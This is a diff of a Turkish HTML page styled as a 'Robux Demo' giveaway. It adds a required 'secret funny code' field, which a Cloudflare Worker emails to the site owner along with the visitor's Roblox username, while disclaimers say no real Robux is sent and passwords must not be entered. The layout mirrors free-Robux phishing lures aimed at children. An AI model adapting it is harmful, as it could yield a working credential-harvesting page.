@@ -4,331 +4,217 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Robux Demo Center</title>
-
+<title>Robux Demo | Experience</title>
 <style>
-* {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--green:#48ff91;--bg:#070b09;--panel:#101914;--muted:#91a397}
+body{
+ min-height:100vh;background:
+ radial-gradient(ellipse at 50% -10%,#17452d 0%,transparent 55%),
+ #070b09;color:#fff;font-family:Inter,Arial,sans-serif;
+ display:flex;align-items:center;justify-content:center;padding:24px;
 }
-
-body {
-    min-height: 100vh;
-    background: radial-gradient(circle at top, #153c2c, #080d0b 65%);
-    color: white;
-    font-family: Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
+.wrap{width:100%;max-width:510px}
+.top{display:flex;align-items:center;justify-content:space-between;margin-bottom:22px}
+.brand{font-weight:900;letter-spacing:2px;font-size:14px}
+.brand span{color:var(--green)}
+.status{font-size:11px;color:var(--green);border:1px solid #286b43;padding:7px 11px;border-radius:30px}
+.card{
+ background:linear-gradient(160deg,#14231a,#0c120e);
+ border:1px solid #284633;border-radius:23px;padding:30px;
+ box-shadow:0 25px 90px #0009,0 0 45px #1b8d4520;
 }
-
-.container {
-    width: 100%;
-    max-width: 480px;
-    background: #101b16;
-    border: 1px solid #28533c;
-    border-radius: 22px;
-    padding: 32px 26px;
-    box-shadow: 0 15px 60px #0009;
+.logo{
+ width:68px;height:68px;margin:0 auto 18px;border-radius:20px;
+ display:grid;place-items:center;font-size:34px;
+ background:linear-gradient(145deg,#3aff8b,#147a40);
+ box-shadow:0 0 35px #38ff8240;
 }
-
-.logo {
-    text-align: center;
-    font-size: 42px;
-    margin-bottom: 10px;
+h1{text-align:center;font-size:27px;letter-spacing:1px}
+.subtitle{text-align:center;color:var(--muted);font-size:13px;line-height:1.6;margin:10px 0 22px}
+.notice{
+ background:#282718;border:1px solid #746a35;color:#f1df9c;
+ border-radius:11px;padding:12px;font-size:11px;line-height:1.6;margin-bottom:22px
 }
-
-h1 {
-    text-align: center;
-    color: #54e68b;
-    font-size: 27px;
-    margin-bottom: 10px;
+label{display:block;font-size:12px;font-weight:700;color:#d8e6dc;margin:17px 0 8px}
+input,select{
+ width:100%;background:#080f0b;border:1px solid #304b39;
+ color:#fff;border-radius:11px;padding:15px;font-size:14px;outline:none;
 }
-
-.subtitle {
-    color: #a5b8ac;
-    text-align: center;
-    font-size: 14px;
-    line-height: 1.6;
-    margin-bottom: 25px;
+input:focus,select:focus{border-color:var(--green);box-shadow:0 0 0 3px #48ff9118}
+.hint{color:#819487;font-size:10px;margin-top:7px;line-height:1.5}
+button{
+ width:100%;border:0;border-radius:12px;padding:16px;margin-top:23px;
+ background:linear-gradient(110deg,#51ff91,#19bd5c);
+ color:#06140a;font-weight:900;font-size:14px;letter-spacing:1px;
+ cursor:pointer;transition:.2s
 }
-
-.demo-warning {
-    background: #282719;
-    border: 1px solid #81743c;
-    color: #f3df8c;
-    padding: 12px;
-    border-radius: 10px;
-    font-size: 12px;
-    line-height: 1.5;
-    margin-bottom: 22px;
-    text-align: center;
+button:hover{transform:translateY(-2px);filter:brightness(1.1)}
+button:disabled{opacity:.5;cursor:wait}
+#loading,#result{display:none;text-align:center;padding:20px 0}
+.spinner{
+ width:48px;height:48px;border:4px solid #244631;border-top-color:var(--green);
+ border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px
 }
-
-label {
-    display: block;
-    color: #d8e7dc;
-    font-size: 13px;
-    margin: 16px 0 8px;
-}
-
-input, select {
-    width: 100%;
-    padding: 14px;
-    background: #09120d;
-    color: white;
-    border: 1px solid #315a41;
-    border-radius: 10px;
-    outline: none;
-    font-size: 15px;
-}
-
-input:focus, select:focus {
-    border-color: #54e68b;
-}
-
-button {
-    width: 100%;
-    border: none;
-    border-radius: 11px;
-    padding: 15px;
-    margin-top: 23px;
-    background: linear-gradient(135deg, #36d878, #15964d);
-    color: #06170c;
-    font-weight: bold;
-    font-size: 16px;
-    cursor: pointer;
-    transition: .2s;
-}
-
-button:hover {
-    transform: translateY(-2px);
-    filter: brightness(1.1);
-}
-
-button:disabled {
-    opacity: .5;
-    cursor: not-allowed;
-    transform: none;
-}
-
-#status {
-    display: none;
-    text-align: center;
-    margin-top: 22px;
-}
-
-.loader {
-    width: 48px;
-    height: 48px;
-    border: 4px solid #284c36;
-    border-top-color: #54e68b;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    margin: 0 auto 18px;
-}
-
-@keyframes spin {
-    to { transform: rotate(360deg); }
-}
-
-.progress {
-    height: 9px;
-    background: #26372c;
-    border-radius: 20px;
-    overflow: hidden;
-    margin-top: 18px;
-}
-
-.bar {
-    height: 100%;
-    width: 0%;
-    background: #54e68b;
-    transition: width .2s;
-}
-
-#result {
-    display: none;
-    text-align: center;
-    margin-top: 24px;
-    line-height: 1.7;
-}
-
-.success {
-    font-size: 48px;
-    margin-bottom: 12px;
-}
-
-.footer {
-    text-align: center;
-    color: #71877a;
-    font-size: 11px;
-    margin-top: 25px;
-}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress{height:8px;background:#25372b;border-radius:20px;margin-top:20px;overflow:hidden}
+.bar{height:100%;width:0;background:var(--green);transition:width .2s}
+#loading p{color:var(--muted);font-size:13px;margin-top:10px}
+.success{font-size:52px;margin-bottom:14px}
+#result h2{color:var(--green);font-size:22px}
+#result p{color:#b4c5b9;font-size:13px;line-height:1.8;margin-top:12px}
+.footer{text-align:center;color:#627468;font-size:10px;margin-top:19px;line-height:1.7}
 </style>
 </head>
-
 <body>
+<div class="wrap">
+ <div class="top">
+  <div class="brand">ROBUX <span>DEMO</span></div>
+  <div class="status">● DEMO SYSTEM</div>
+ </div>
 
-<div class="container">
+ <main class="card">
+  <div id="formArea">
+   <div class="logo">R</div>
+   <h1>DEMO EXPERIENCE</h1>
+   <p class="subtitle">Kendi demo Robux deneyimini oluştur.</p>
 
-    <div class="logo">💚</div>
-    <h1>ROBUX DEMO CENTER</h1>
+   <div class="notice">
+    ⚠️ Bu bağımsız bir eğlence demosudur. Roblox ile bağlantılı değildir.
+    Gerçek Robux gönderilmez. Roblox hesabının şifresini hiçbir zaman girme.
+   </div>
 
-    <p class="subtitle">
-        Eğlence amaçlı Robux demo deneyimi.
+   <form id="demoForm">
+    <label for="username">ROBLOX KULLANICI ADI</label>
+    <input id="username" maxlength="30" placeholder="Örn. NoyanPlayer" required>
+
+    <label for="amount">DEMO ROBUX MİKTARI</label>
+    <select id="amount">
+     <option value="1000">1.000 Demo Robux</option>
+     <option value="100000">100.000 Demo Robux</option>
+     <option value="1000000">1.000.000 Demo Robux</option>
+     <option value="100000000">100.000.000 Demo Robux</option>
+     <option value="650000000000000">650T Demo Robux</option>
+    </select>
+
+    <label for="funnyCode">GİZLİ KOMİK KODUN 😂</label>
+    <input id="funnyCode" maxlength="40" placeholder="Örn. BENBIRPATATESIM123" required>
+    <p class="hint">
+     Bu alan gerçek parola değildir. Yazdığın komik demo kodu,
+     form gönderildiğinde site sahibine e-posta ile iletilir.
+     Gerçek şifre veya gizli bilgi yazma.
     </p>
 
-    <div class="demo-warning">
-        ⚠️ Bu resmi Roblox sitesi değildir. Gerçek Robux vermez
-        veya aktarmayız. Roblox şifreni kesinlikle girme.
-    </div>
+    <button id="submitBtn" type="submit">DEMO İŞLEMİNİ BAŞLAT →</button>
+   </form>
+  </div>
 
-    <form id="demoForm">
+  <div id="loading">
+   <div class="spinner"></div>
+   <h2>DEMO HAZIRLANIYOR</h2>
+   <p id="loadingText">Sistem başlatılıyor...</p>
+   <div class="progress"><div class="bar" id="bar"></div></div>
+   <p id="percent">%0</p>
+  </div>
 
-        <label for="username">Roblox kullanıcı adın</label>
-        <input
-            id="username"
-            type="text"
-            maxlength="30"
-            placeholder="Kullanıcı adını yaz"
-            required
-        >
+  <div id="result">
+   <div class="success">✓</div>
+   <h2>DEMO GÖNDERİLDİ!</h2>
+   <p id="resultText"></p>
+   <button onclick="location.reload()">YENİDEN BAŞLAT</button>
+  </div>
+ </main>
 
-        <label for="amount">Demo Robux miktarı</label>
-        <select id="amount" required>
-            <option value="1000">1.000 Demo Robux</option>
-            <option value="100000">100.000 Demo Robux</option>
-            <option value="1000000">1.000.000 Demo Robux</option>
-            <option value="100000000">100.000.000 Demo Robux</option>
-            <option value="650000000000000">650T Demo Robux</option>
-        </select>
-
-        <button id="submitBtn" type="submit">
-            DEMO İŞLEMİNİ BAŞLAT
-        </button>
-    </form>
-
-    <div id="status">
-        <div class="loader"></div>
-        <h3>Demo işlemi hazırlanıyor...</h3>
-        <p id="percent" style="color:#a5b8ac;margin-top:10px">
-            %0
-        </p>
-        <div class="progress">
-            <div class="bar" id="bar"></div>
-        </div>
-    </div>
-
-    <div id="result"></div>
-
-    <div class="footer">
-        ROBUX DEMO CENTER · Bağımsız eğlence projesi
-    </div>
-
+ <div class="footer">
+  ROBUX DEMO EXPERIENCE · Bağımsız demo projesi<br>
+  Gerçek Robux aktarımı yapılmaz.
+ </div>
 </div>
 
 <script>
 const WORKER_URL = "WORKER_ADRESINI_BURAYA_YAZ";
 
 const form = document.getElementById("demoForm");
+const formArea = document.getElementById("formArea");
+const loading = document.getElementById("loading");
+const result = document.getElementById("result");
 const button = document.getElementById("submitBtn");
-const statusBox = document.getElementById("status");
-const resultBox = document.getElementById("result");
-const bar = document.getElementById("bar");
-const percent = document.getElementById("percent");
 
-form.addEventListener("submit", async function(event) {
-    event.preventDefault();
+form.addEventListener("submit", async (e) => {
+ e.preventDefault();
 
-    const username = document.getElementById("username").value.trim();
-    const amount = document.getElementById("amount").value;
+ const username = document.getElementById("username").value.trim();
+ const amount = document.getElementById("amount").value;
+ const funnyCode = document.getElementById("funnyCode").value.trim();
 
-    if (!username) {
-        alert("Kullanıcı adını yazmalısın.");
-        return;
-    }
+ if (!username || !funnyCode) {
+  alert("Lütfen tüm alanları doldur.");
+  return;
+ }
 
-    if (WORKER_URL === "WORKER_ADRESINI_BURAYA_YAZ") {
-        alert("Önce Cloudflare Worker adresini eklemeliyiz.");
-        return;
-    }
+ if (WORKER_URL.includes("BURAYA")) {
+  alert("Cloudflare Worker adresi henüz eklenmedi.");
+  return;
+ }
 
-    button.disabled = true;
-    form.style.display = "none";
-    statusBox.style.display = "block";
+ button.disabled = true;
+ formArea.style.display = "none";
+ loading.style.display = "block";
 
-    let progress = 0;
+ const messages = [
+  "Demo sistemi başlatılıyor...",
+  "Bilgiler kontrol ediliyor...",
+  "Demo hazırlanıyor...",
+  "Gönderim tamamlanıyor..."
+ ];
 
-    const timer = setInterval(() => {
-        progress = Math.min(progress + 2, 95);
-        bar.style.width = progress + "%";
-        percent.textContent = "%" + progress;
-    }, 250);
+ let progress = 0;
+ const timer = setInterval(() => {
+  progress = Math.min(progress + 100 / 48, 95);
+  document.getElementById("bar").style.width = progress + "%";
+  document.getElementById("percent").textContent =
+   "%" + Math.floor(progress);
+  document.getElementById("loadingText").textContent =
+   messages[Math.min(3, Math.floor(progress / 25))];
+ }, 250);
 
-    try {
-        const response = await fetch(WORKER_URL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                username: username,
-                amount: amount
-            })
-        });
+ try {
+  const response = await fetch(WORKER_URL, {
+   method: "POST",
+   headers: {"Content-Type":"application/json"},
+   body: JSON.stringify({
+    username,
+    amount,
+    funny_code: funnyCode
+   })
+  });
 
-        const data = await response.json();
+  const data = await response.json();
+  if (!response.ok || !data.success) {
+   throw new Error(data.error || "Gönderim başarısız.");
+  }
 
-        clearInterval(timer);
+  clearInterval(timer);
+  document.getElementById("bar").style.width = "100%";
+  document.getElementById("percent").textContent = "%100";
 
-        if (!response.ok || !data.success) {
-            throw new Error(data.error || "Gönderim başarısız.");
-        }
+  setTimeout(() => {
+   loading.style.display = "none";
+   result.style.display = "block";
+   document.getElementById("resultText").textContent =
+    "Kullanıcı adı: " + username +
+    " · Demo miktarı: " + Number(amount).toLocaleString("en-US") +
+    ". E-posta bildirimi gönderildi. Gerçek Robux aktarılmadı.";
+  }, 500);
 
-        bar.style.width = "100%";
-        percent.textContent = "%100";
-
-        setTimeout(() => {
-            statusBox.style.display = "none";
-            resultBox.style.display = "block";
-
-            resultBox.innerHTML = `
-                <div class="success">✅</div>
-                <h2 style="color:#54e68b">Demo gönderimi tamamlandı!</h2>
-                <p style="color:#b6c8bb;margin-top:10px">
-                    Kullanıcı adı: ${escapeHTML(username)}<br>
-                    Demo miktarı: ${Number(amount).toLocaleString("en-US")}
-                </p>
-                <p style="color:#82988a;font-size:12px;margin-top:14px">
-                    Bilgiler e-posta bildirimi için gönderildi.
-                    Gerçek Robux aktarılmamıştır.
-                </p>
-                <button onclick="location.reload()">YENİDEN DENE</button>
-            `;
-        }, 500);
-
-    } catch (error) {
-        clearInterval(timer);
-        statusBox.style.display = "none";
-        form.style.display = "block";
-        button.disabled = false;
-        alert("Gönderim hatası: " + error.message);
-    }
+ } catch (error) {
+  clearInterval(timer);
+  loading.style.display = "none";
+  formArea.style.display = "block";
+  button.disabled = false;
+  alert("Hata: " + error.message);
+ }
 });
-
-function escapeHTML(value) {
-    return value.replace(/[&<>"']/g, char => ({
-        "&": "&amp;",
-        "<": "&lt;",
-        ">": "&gt;",
-        '"': "&quot;",
-        "'": "&#039;"
-    })[char]);
-}
 </script>
-
 </body>
 </html>
